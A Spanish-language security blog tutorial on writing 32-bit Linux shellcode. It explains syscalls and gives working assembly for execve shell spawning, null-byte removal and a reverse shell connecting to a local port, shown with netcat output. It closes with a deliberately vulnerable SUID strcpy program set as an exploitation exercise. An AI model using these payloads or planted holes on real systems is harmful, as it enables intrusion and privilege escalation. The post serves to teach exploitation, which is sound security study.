---
layout: es/blog-detail
comments: true
title: "Shellcodes: &quot;El código de la cáscara&quot;"
date: 2018-07-04T20:52:00+00:00
categories:
    - Exploiting
tags:
    - 32 bit
    - exploit
    - exploiting
    - shellcoding
    - x86
image_src: /assets/uploads/2018/07/Shellcodes-el-codigo-de-la-exploiting-puffin-security.jpg
image_height: 467
image_width: 700
author: Yago Gutierrez
description: Hoy venimos a tratar un tema sencillo, pues es de premisas sencillas, pero que se puede complicar tanto como el programador decida. Me refiero al mundo del shellcoding. Por hoy nos ceñiremos al mundo de linux, ya que tengo entendido que antes de hacer internar...
publish_time: 2018-07-04T20:52:00+00:00
modified_time: 2019-02-19T14:34:02+00:00
comments_value: 0
disqus_identifier: 1739
---
Hoy venimos a tratar un tema sencillo, pues es de premisas sencillas, pero que se puede complicar tanto como el programador decida. Me refiero al mundo del shellcoding. Por hoy nos ceñiremos al mundo de linux, ya que tengo entendido que antes de hacer internar a una decena de personas, debes llamar al psiquiátrico con una semana de antelación para avisar que preparen las camas y demás, cosa que no he hecho, así que Winbugs por ahora se queda sin post.

Asimismo todavía no pasamos de los 32 bits, así que aquí veremos shellcodes para 32 bits.

Arranquemos, ¿qué es un shellcode? Qué mala pregunta, porque ya debería estar claro. Un shellcode es un código en ensamblador (también podemos emplear el término para referirnos a los correspondientes opcodes) que realiza una acción en concreto que supone un aumento de los privilegios del atacante. Puede ser simplemente spawnear una shell (ya sea local, o abrir un puerto de red y spawnear una shell al entrar una conexión ―_bind shell_―, o conectarse a un servidor remoto y spawnear la shell ―conocido como _reverse shell_―), como mostrar/enviar o editar el contenido de un archivo (/etc/sudoers, /etc/shadow, /etc/hosts son targets comunes), o borrar archivos, o descargar un programa y ejecutarlo (normalmente un malware), desactivar mecanismos de protección (ya sea ASLR, un IDS o un firewall). Si bien está claro que las opciones más completas de todas son las de shell, dentro de las cuales una _reverse shell_ tiene una gran ventaja sobre las _bind shell_, pues es un shellcode más corto y además, al ser la máquina víctima la que abre la conexión es más probable que los firewalls que se encuentren entre ella y el Internet dejen la conexión pasar, mientras que se suelen filtrar las conexiones entrantes.  
Un shellcode no solo debe cumplir con su objetivo, sino que también debe adaptarse a las circunstancias que rodean su inyección: espacio disponible y caracteres permitidos. En menor medida, el valor de esp puede interferir, no es raro encontrarse con un shellcode sobrescribiéndose a sí mismo, por lo que dependiendo de la situación puede ser necesario añadir al comienzo una instrucción `sub esp, 0x...` para evitarlo.

El [kernel](https://en.wikipedia.org/wiki/Kernel_(operating_system)) actúa como intermediador entre los programas del userland y el hardware, así como la gestión de la memoria y de procesos. Esto es: maneja la carga y descarga de librerías, la creación de procesos y su terminación, la memoria empleada por estos procesos, provee a los procesos de herramientas para su sincronización (wait(), signal()). También el control del acceso al disco: la creación y el borrado de archivos; su apertura y cierre; su lectura, escritura e incluso el reposicionamiento dentro del archivo abierto. Por el kernel pasan también peticiones para el acceso a dispositivos en general (el disco duro es en sí un dispositivo). También provee al proceso de información sobre el sistema y su fecha y hora, y por último herramientas de comunicación más flexibles que las señales: sockets y las herramientas que los rodean.

Para pedir al kernel que realice alguna de estas acciones debemos ejecutar lo que se llama system call (syscall para los amigos). En linux esto se realiza mediante la interrupción 0x80 (instrucción `int 0x80`), empleando una convención de llamada distinta a la que empleamos para llamar a funciones en x86 (cdecl). Por cierto, la convención de syscall es distinta para x86 y x86\_64 (cómo no). Esta convención es de la siguiente forma: en EAX debe ir el número de syscall (ya las veremos), y en los registros EBX, ECX, EDX, ESI, EDI, EBP se pasan los argumentos de izquierda a derecha (no como en el cdecl que es en orden inverso), viniendo en EAX el valor de retorno. El número de syscall es un número que identifica qué petición hacemos, podemos obtenerlas del archivo unistd\_32.h, para encontrarlo en tu instalación de linux se puede emplear el comando `locate` o `find`.

`$ cat /usr/include/asm/unistd_32.h | grep exit  
#define __NR_exit 1  
#define __NR_exit_group 252`

Como podemos ver, la syscall exit() tiene como número el 0x1. Podemos ver mediante el comando `man` los parámetros que requiere esta llamada. Para especificar que nos referimos a una syscall y no a un comando o una función de librería es necesario emplear para `man` el argumento `2`, de la siguiente forma:  
`man 2 exit`. exit() solo requiere un argumento de tipo int, que indica el código de estado que debe devolver el proceso al salir. Por tanto una llamada como `exit(3);` debería ser tal que así  
`mov eax, 0x1  
mov ebx, 0x3  
int 0x80`  
Vamos a probarlo creando un ejecutable ELF  

    $ cat exit.asm
    BITS 32
    global _start
    _start:
        mov eax, 0x1
        mov ebx, 0x3
        int 0x80

$ nasm exit.asm -o exit.o -felf

$ ld -melf\_i386 exit.o -o exit

Ahora ejecutémoslo mediante strace() para apreciar qué llamadas al sistema se realizan durante su ejecución  
`$ strace ./exit  
execve("./exit", ["./exit"], 0x7ffdcf91b610 /* 39 vars */) = 0  
strace: [ Process PID=31529 runs in 32 bit mode. ]  
exit(3) = ?  
+++ exited with 3 +++`

Se puede ver que la primera llamada es la que practica el propio strace para ejecutar nuestro programa, se trata de execve(), para crear un nuevo proceso. Tras esta llamada, el resto de la información pertenece a nuestro programita, el cual, como vemos, solo realiza una petición al sistema: `exit(3)`, exactamente como preveíamos.

Veamos la implementación de exit() del GLIBC (versión 2.27.9000). En stdlib/exit.c encontramos el siguiente código:  

    void
    exit (int status)
    {
      __run_exit_handlers (status, &__exit_funcs, true, true);
    }

Siendo \_\_run\_exit\_handlers() una función que se encarga de ejecutar la lista de funciones atexit y on\_exit y las funciones de la sección DTORS (destructores). Finalmente termina ejecutando `_exit(status);`  

    void
    attribute_hidden
    __run_exit_handlers (int status, struct exit_function_list **listp,
           bool run_list_atexit, bool run_dtors)
    {
      [...]
      _exit (status);
    }

Encontramos en `sysdeps/unix/sysv/linux/_exit.c` una definición de \_exit(), sin embargo es un wrapper (un envoltorio) para una macro \_\_syscall\_exit() que a su vez es una macro formada mediante una macro «pegamento» (una macro que une dos cadenas mediante el operador «##»), de modo que al final es imposible rastrearlo a una definición real. Se me ocurre revisar archivos «.S» (la extensión que usa `gas` para los archivos de asm) y encuentro `sysdeps/unix/sysv/linux/i386/_exit.S`  

    #include <sysdep.h>

.text  
.type \_exit,@function  
.global \_exit  
\_exit:  
movl 4(%esp), %ebx

/\* Try the new syscall first. \*/  
#ifdef \_\_NR\_exit\_group  
movl $\_\_NR\_exit\_group, %eax  
ENTER\_KERNEL  
#endif

/\* Not available. Now the old one. \*/  
movl $\_\_NR\_exit, %eax  
/\* Don’t bother using ENTER\_KERNEL here. If the exit\_group  
syscall is not available AT\_SYSINFO isn’t either. \*/  
int $0x80

/\* This must not fail. Be sure we don’t return. \*/  
hlt

Todo este rollo lo he hecho para demostrar cómo funciona en último término una compilación, al menos para las llamadas al sistema.  
Este código se encuentra en sintaxis gas, muy similar a la sintaxis AT&T. Podemos ver claramente que se mueve primero a EBX el argumento de tipo entero «status», y después, si existe la syscall exit\_group() ―una syscall más moderna que exit(), que termina no solo el thread actual sino que todo el grupo de threads―, mueve a EAX el número de syscall correspondiente (obtenido mediante el archivo /usr/include/asm/unistd.h), para terminar ejecutando una macro ENTER\_KERNEL, definida al final como `int 0x80`. Esta comprobación se hace en tiempo de compilación, es de hecho una directiva de preprocesador, es decir, se comprueba incluso antes de iniciar la traducción a asm, sin embargo es posible que la syscall sí se defina en el sistema en el que se compila el programa, pero que llegue el momento en que ese mismo binario se ejecute en un sistema que, por el motivo que sea, no soporte dicha llamada, en este caso, el sistema devolverá ENOSYS («Function not implemented») y proseguirá la ejecución del programa. Para evitar esto se añade incondicionalmente la llamada a exit(), la antigua llamada que debe estar soportada por todo el mundo. En cualquier caso, si el sistema no se entera, siempre se termina mediante `hlt` para asegurar un no retorno.  
Podemos verificar este resultado mediante un objdump sobre la librería ya compilada:  

    $ objdump -d /usr/lib32/libc.so.6
    [...]
    000c0485 <_exit>:
       c0485:       8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4] # El argumento status
       c0489:       b8 fc 00 00 00          mov    eax,0xfc                # __NR_exit_group
       c048e:       65 ff 15 10 00 00 00    call   DWORD PTR gs:0x10       # ENTER_KERNEL = int 0x80
       c0495:       b8 01 00 00 00          mov    eax,0x1                 # __NR_exit
       c049a:       cd 80                   int    0x80                    # syscall
       c049c:       f4                      hlt

A nosotros como atacantes nos interesan más llamadas como execve() (crear un proceso), write() (escribir, aunque primero es necesario obtener un fd mediante open()), rename() o kill().

Espero que el lector sea capaz de ver la amplia gama de posibilidades que tiene una vez consigue la posibilidad de inyectar código arbitrario. Si bien yo me quedaré en spawnear una shell local o inversa, el lector puede explayarse por todos los tipos de shellcodes posibles.

Empecemos a desarrollar nuestro shellcode. La parte fundamental del shellcode es la llamada a execve(), que se debe efectuar además de la siguiente forma:  

    char* arg[2] = {"/bin/sh", NULL};
    execve(arg[0], arg, NULL);

A la hora de hacer el código en asm nos surge una duda, y es cómo referenciar a la cadena «/bin/sh». Echando la mirada atrás vemos el [shellcode de Aleph1](http://phrack.org/issues/49/14.html) (ya mencionado en episodios anteriores)  
\[Me he tomado la molestia de traducirlo a sintaxis intel para que sea ensamblable con nasm\]  

    BITS 32
    global _start
    _start:
        jmp short a
        b:
        pop esi
        mov [esi+0x8],esi
        mov byte [esi+0x7],0x0
        mov dword [esi+0xc],0x0
        mov eax,0xb
        mov ebx,esi
        lea ecx,[esi+0x8]
        lea edx,[esi+0xc]
        int 0x80
        a:
        call b
    db "/bin/sh"

Comienza mediante un salto a `call b`, esta instrucción equivale a `push eip ; jmp b`, como ya vimos (`jmp` equivale a un `mov eip, ...`), colocando en el stack el eip de ese instante, que, no por casualidad, apunta a la cadena «/bin/sh» (eip contiene siempre la dirección de la siguiente instrucción a la que se va a ejecutar, la cual calcula sumando al eip de la instrucción acual el tamaño de dicha instrucción). De esta forma al volver al `pop esi` obtenemos en esi la dirección de «/bin/sh». Originalmente también incluía al final un exit(0) para evitar que rompa al salir de /bin/sh, pero no es necesario hoy en día.

Claro que siempre puedes buscar en el binario (o en las librerías que usa) una cadena «/bin/sh» y emplearla, pero es más dependiente del binario, y a no ser que no tenga ASLR (o que el binario no sea PIE, en el caso de que en él se encuentre la cadena) necesitarás un memory leak, cosa que no siempre está disponible. Es necesario tener en cuenta que la posición en la que se encuentra algo en memoria es muy efímera, puede variar en función del compilador, del sistema, por ASLR…, por eso es mejor atar bien los cabos. Aquí desde luego buscaremos la solución más portable posible, sin embargo ahí fuera siempre se puede analizar la situación y aplicar una solución específica, especialmente en un ataque de elevación de privilegios, donde tienes acceso al binario (saber si tiene RELRO, si es PIE, además no tienes que especular qué compilador se ha empleado) y puedes obtener más información del sistema (¿ASLR?).

Prosigamos. Podemos obtener sus opcodes  
`eb1e5e897608c6460700c7460c00000000b80b00000089f38d4e088d560c  
cd80e8ddffffff2f62696e2f7368`  
El problema principal de ese shellcode: presencia de bytes nulos, lo que elimina vectores de inyección como str\*(), \*printf() y \*get\*() y ahora no sé si me dejo alguno en el tintero. Eso nos deja como posibles entradas \*read\*().  
Pero no hay que preocuparse, siempre tiene solución esto. Vamos a reescribirlo evitando los bytes nulos, esto lo haremos empleando siempre el registro del menos tamaño posible, y en lugar de realizar mov’s para hacer 0 un registro haremos `xor reg, reg`, que es equivalente.  

    BITS 32
    global _start
    _start:
        jmp a
        b:
        pop esi
        mov [esi+0x8], esi
        xor eax, eax
        mov [esi+0x7], al
        mov [esi+0xc], eax
        mov al, 0xb
        mov ebx, esi
        lea ecx, [esi+0x8]
        lea edx, [esi+0xc]
        int 0x80
        a:
        call b
    db "/bin/sh"

Sus opcodes son  
`eb185e89760831c088460789460cb00b89f38d4e088d560ccd80e8e3ffff  
ff2f62696e2f7368`  
Ya no hay bytes nulos, y además hemos reducido el tamaño en 6 bytes (de 44 a 38).

No queda claro quién dejó de lado esa forma de obtener una dirección a «/bin/sh» al percatarse de que se podía aprovechar que «/bin//sh» (que es igual de válido que /bin/sh o que //bin/sh, o ///bin/////sh) mide 8 bytes, de forma que podemos poner esa cadena en el stack mediante dos `push`‘s y obtener la dirección mediante un `mov ..., esp`. Veamos el típico shellcode:  

    xor    eax, eax
    push   eax          ; Este null hace de terminación de la cadena ("")
    push   0x68732f2f   ; "//sh" (ya tenemos en el stack "//sh")
    push   0x6e69622f   ; "/bin" (ya tenemos "/bin//sh")
    mov    ebx, esp     ; ebx = path = &"/bin//sh" -> execve("/bin//sh", ..., ...);
    push   eax          ; argv[1] = NULL (argv se debe terminar con un puntero nulo que indique que no hay más argumentos)
    push   ebx          ; argv[0] = &"/bin//sh"
    mov    ecx, esp     ; ecx = argv -> execve("/bin//sh", ["/bin//sh", NULL], ...);
    xor    edx, edx     ; edx = envp = NULL -> execve("/bin//sh", ["/bin//sh", NULL], NULL);
    mov    al, 0xb      ; syscall 0xb
    int    0x80

En función de en qué condiciones se encuentre el programa explotado (si tiene seguridad social y esas cosas, ya sabes) cuando comience la ejecución de nuestro código podemos hacer más pequeño este código. Si eax ya vale 0x00000000 no tenemos que hacerlo nosotros, o incluso si edx contiene una dirección que apunte a un NULL (o a algo que valga como `char** envp`) tampoco tenemos que hacerlo NULL.  
De esta forma obtenemos un shellcode que mide 25 bytes.

Veamos cómo hacer un shellcode de conexión inversa (_reverse shell_). Para iniciar una conexión TCP como cliente es necesario primero obtener ejecutar un socket(AF\_INET, SOCK\_STREAM, IPPROTO\_TCP) que devuelva un fd sobre el que ejecutar un connect(). Las funciones de red en un sistema Linux se encuentran dentro de una única syscall, `socketcall`. Para indicar dentro de socketcall qué función deseamos se emplea el registro EBX, siendo 0x1 para socket() y 0x3 para connect() \[0x2 para bind, 0x4 para listen(), 0x5 para accept()\], empleándose para pasar los argumentos el stack, similar a cdecl, salvo que es necesario pasar un puntero a los argumentos en ECX. Por último es necesario ejecutar un dup2() sobre stdio, stderr y stdin para que envíen/reciban datos a través del socket, permitiendo así al atacante interactuar con la shell, la cual spawneamos al final.

    xor    eax, eax
    xor    ebx, ebx
    xor    edx, edx

push 0x6 ; arg protocol = IPPROTO\_TCP  
push 0x1 ; arg type = SOCK\_STREAM  
push 0x2 ; arg domain = AF\_INET  
mov ecx, esp ; puntero a los argumentos de socket()  
mov bl, 0x1 ; socket()  
mov al, 102 ; \_\_NR\_socketcall  
int 0x80 ; socket(AF\_INET, SOCK\_STREAM, IPPROTO\_TCP)  
mov esi, eax ; esi = fd

push 0x0101017f ; sockaddr\_in.sin\_addr = 127.1.1.1  
push word 0x697a ; sockaddr\_in.sin\_port = 31337  
push word 0x2 ; sockaddr\_in.sin\_family = AF\_INET  
mov ecx, esp ; ecx = &sockaddr\_in  
push 0x10 ; arg address\_len = sizeof(struct sockaddr\_in) = 16  
push ecx ; arg address = &sockaddr\_in  
push esi ; arg socket = fd  
mov ecx, esp ; puntero a los argumento de connect()  
mov bl, 0x3 ; connect()  
mov al, 102 ; \_\_NR\_socketcall  
int 0x80 ; connect(fd, &sockaddr\_in, 16)

xor ecx, ecx  
mov cl, 0x3  
mov ebx, esi ; fildes2 = fd  
bucle:  
dec cl ; fildes = stderr (fildes = 3) / stdout (2) / stdin (0)  
mov al, 0x3f ; \_\_NR\_dup2  
int 0x80 ; dup2()  
jne bucle

; execve(«/bin//sh», \[«/bin//sh», NULL\], NULL);  
push edx  
push 0x68732f6e  
push 0x69622f2f  
mov ebx, esp  
push edx  
push ebx  
mov ecx, esp  
push edx  
mov edx, esp  
xor eax, eax  
mov al, 0xb  
int 0x80

Este código está basado en uno de blackngel (David Puente Castro), pero yo he corregido un fallito que tenía y lo he mejorado algo, todo por vosotros 😉 .  
Obsérvese que en la IP he usado 127.1.1.1 (equivalente a 127.0.0.1) para evitar poner un número nulo, por si acaso alguien lo desea usar para probar en algún programa vulnerable.

Podemos probarlo:  

    $ nc -lvvp31337 
    Listening on any address 31337
    ^Z
    [1]+  Detenido                nc -lvvp31337

$ bg  
\[1\]+ nc -lvvp31337 &

$ nasm a.asm -o a.o -felf

$ ld -melf\_i386 a.o -o a

$ ./a &  
\[2\] 12395  
Connection from 127.0.0.1:55484

$ fg  
nc -lvvp31337  
whoami  
arget  
exit  
Total received bytes: 156  
Total sent bytes: 15  
\[2\]- Hecho ./a

$

Este shellcode es al final lo mismo que un `nc 127.1.1.1 31337 -e /bin//sh`, y todo en 88 bytes, bonito ¿eh?

Es necesario apuntar que a la hora de ejecutar un binario SUID, para evitar que execve() cambie el effective uid y el saved uid del programa al real uid (nuestro uid original), es necesario setear el real uid a 0 también, tarea que se puede realizar mediante una llamada al sistema como setresuid() o setuid(), o en el caso de un binario de 32 bits, setuid32() o setresuid32(). En los sistemas de 64 bits los programas de 32 bits no son tratados de igual manera (el apartbyte), por lo que al intentar hacer llamadas como setresuid() desde un ejecutable de 32 bits se devolverá el error ENOSYS, «no implementado», ya que se definen para eso syscalls como setuid32() o setresuid32(). Se pueden comprobar cuáles son las llamadas al sistema de este tipo implementadas mediante  
`cat /usr/include/asm/unistd_32.h | grep set | grep id`

No podemos olvidar que cuando el vector es a través de la línea de comandos no podemos dejar sin escapar en el payload (ya sea en el shellcode como en el relleno como en la dirección de salto) caracteres especiales como las comillas (0x22), o el espacio (0x20). Puede ser interesante saber que en un caso de explotación local se puede [incluir el shellcode en un variable de entorno](https://gist.github.com/superkojiman/6a6e44db390d6dfc329a), aun siendo un binario SUID.  
Tampoco podemos ignorar que existen los IPSs (Intrusion Prevention System). En nuestro caso por lo general funcionan restringiendo las entradas a las lógicas para lo que pide el programa, no tiene sentido que cuando el programa pida un nombre, por ejemplo, acepte valores que no sean del alfabeto (a no ser que tengas un nombre muy raro), o pidiendo un teléfono no deberían llegar otros caracteres que no sean números. En esto pueden ayudar shellcodes imprimibles (o ASCII printable shellcodes), si bien en el tema del número de teléfono uno está más bien apretado (no creo que sea posible construir un shellcode solo usando 10 posibles caracteres). Este es un tema **muy** interesante, pero **por ahora** solo os dejaré un [y un](https://nets.ec/Ascii_shellcode) [**gran ejemplo**](https://www.exploit-db.com/exploits/13284/).

Otro tema relacionado es el de los shellcodes polimórficos. Un IPS también puede reconocer un shellcode del mismo modo que un antivirus detecta un virus (de hecho los antivirus muchas veces detectan intentos de explotación). De modo que a veces es necesario un shellcode polimórfico, es decir, un shellcode que cambia drásticamente pero no cambia absolutamente lo que en último término acaba haciendo. Esto se puede lograr de distintas maneras, la más sencilla de todas es «cifrarlo» mediante un simple xor y descifrarlo en memoria mediante un _stub_ antes de saltar a él. El problema es que también se suelen detectar los _stubs_, pero si no fuese así, ¿dónde estaría la diversión? Para evitar situar en el stub la clave de descifrado (que facilita el proceso de detección), se puede emplear como código algún valor que el atacante conoce que está disponible en la máquina víctima.

Por último mencionar los _egg hunters_. En ocasiones el espacio disponible es demasiado pequeño para introducir el shellcode, así que aprovechamos otra entrada de datos para introducir el shellcode y en el vector de explotación introducimos un _egg hunter_, que básicamente se dedicará a revisar la memoria buscando nuestro shellcode (empleando para ello una cadena que actúe de identificador. Se puede diseñar fácilmente un _egg hunter_ que sea realmente pequeño (alrededor de los 30-40 bytes).

Sin embargo, el post de hoy ya ha sido suficientemente largo, y antes de caer redondo sobre el teclado prefiero dejar de escribir. En unos días traeré otro post sobre shellcodes, tratando _ASCII printable shellcodes_, _polimorfic shellcodes_ y _egg hunters_. Buenas tardes.

Emplea 3 4 (¿o por qué no 5 o 6?) shellcodes distintos para explotar el siguiente programa  
\[Compilar con `gcc -fno-stack-protector -D_FORTIFY_SOURCE=0 -z execstack -no-pie -fno-pie -m32 vuln.c -o vuln` y convertir en binario SUID de root (`sudo chown root:root vuln ; sudo chmod u+s vuln`) y ejecutar en un sistema con ASLR desactivado\].  

    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

void panic()  
{  
puts(«Intento de hacking detectado»);  
exit(-1);  
}

void imprimir(char\* arg)  
{  
char buf\[1024\];  
if(strchr(arg, ‘x0b’)) panic();  
strcpy(buf, arg);  
printf(«%sn», buf);  
}

int main(int argc, char\*\* argv)  
{  
if(argc < 2) return 1;  
imprimir(argv\[1\]);  
return 0;  
}